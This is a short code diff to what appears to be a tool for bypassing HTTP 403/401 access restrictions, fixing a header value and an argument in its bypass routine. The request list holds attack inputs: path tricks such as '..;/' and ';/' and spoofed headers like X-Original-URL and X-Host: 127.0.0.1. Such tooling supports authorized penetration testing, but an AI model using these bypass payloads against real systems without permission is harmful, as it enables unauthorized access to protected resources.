@@ -22,7 +22,7 @@ request_objects = [
     {"method": "GET", "path": "$path.json"},
     {"method": "GET", "path": "$path..;/"},
     {"method": "GET", "path": "$path;/"},
-    {"method": "GET", "path": "", "headers": {"X-rewrite-url": "/$path"}},
+    {"method": "GET", "path": "", "headers": {"X-rewrite-url": "$path"}},
     {"method": "POST","path": "$path", "headers": {"Content-Length": "0"}},
     {"method": "GET", "path": "$path", "headers": {"X-Host": "127.0.0.1"}},
     {"method": "GET", "path": "$path", "headers": {"X-Original-URL": "$path"}},
@@ -115,7 +115,7 @@ def sendRequest(host, path, custom_headers):
         headers = {header.split(":")[0]: header.split(":")[1].strip() for header in custom_headers} if custom_headers else {}
         response = requests.get(url + path, headers=headers)
         if response.status_code == 403 or response.status_code == 401:
-            attemptBypass(url, path, custom_headers)
+            attemptBypass(host, path, custom_headers)
     except requests.exceptions.ConnectionError:
         pass
     except requests.RequestException:
